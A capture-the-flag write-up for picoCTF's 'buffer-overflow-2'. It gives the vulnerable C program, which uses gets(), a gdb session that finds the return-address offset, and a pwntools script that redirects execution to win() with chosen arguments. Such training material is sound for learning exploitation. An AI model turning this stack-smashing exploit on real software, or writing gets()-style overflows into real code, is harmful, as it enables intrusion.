# picoCTF: buffer-overflow-2

We can get the flag if we modify the return address of `vuln` to the address of `win`, and set 0xCAFEF00D to `arg1` and 0xF00DF00Dto `arg2`.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

Note that architecture is 32 bit.

```bash
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Then, we can use gdb to get the offset to the return address of `vuln` to `buf`.

```bash
# set the breakpoint at the end of vuln
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ pattern create 200 dummyinput

gdb-peda$ run < dummyinput
Starting program: /picoctf/buffer-overflow-2/vuln < dummyinput
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string:
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
[----------------------------------registers-----------------------------------]
EAX: 0xc9
EBX: 0x804c000 --> 0x804bf10 --> 0x1
ECX: 0xf7fa79b4 --> 0x0
EDX: 0x1
ESI: 0xffffcca4 --> 0xffffcdea 
EDI: 0xf7ffcb80 --> 0x0
EBP: 0xffffcbb8 ("MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
ESP: 0xffffcb40 --> 0xf7fa6da0 --> 0xfbad2887
EIP: 0x804936c (<vuln+52>:      nop)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049363 <vuln+43>: push   eax
   0x8049364 <vuln+44>: call   0x8049120 <puts@plt>
   0x8049369 <vuln+49>: add    esp,0x10
=> 0x804936c <vuln+52>: nop
   0x804936d <vuln+53>: mov    ebx,DWORD PTR [ebp-0x4]
   0x8049370 <vuln+56>: leave
   0x8049371 <vuln+57>: ret
   0x8049372 <main>:    endbr32
[------------------------------------stack-------------------------------------]
0000| 0xffffcb40 --> 0xf7fa6da0 --> 0xfbad2887
0004| 0xffffcb44 --> 0xf7fa6de7 --> 0xfa79b40a
0008| 0xffffcb48 --> 0x1
0012| 0xffffcb4c ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0xffffcb50 ("AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0020| 0xffffcb54 ("ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0xffffcb58 ("$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0028| 0xffffcb5c ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804936c in vuln ()
gdb-peda$ pattern offset MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA found at offset: 108
```

Since the return address is next to `ebp`, we need to pad 108 + 4 bytes.

Since all arguments of the function is loaded from the stack in 32 bit, we need to set the arguments to `win` next to the overwritten address.

Thus, the final script is as follows:

```py
from pwn import *

offset = 108 + 4 #112
win_addr = 0x08049296
argv1 = 0xCAFEF00D
argv2 = 0xF00DF00D


r = process("./vuln")
r.recvuntil(b"Please enter your string:")
r.sendline(b"A"*offset + p32(win_addr) + p32(0x1) + p32(argv1) + p32(argv2))
print(r.recvline())
print(r.recvline())
```

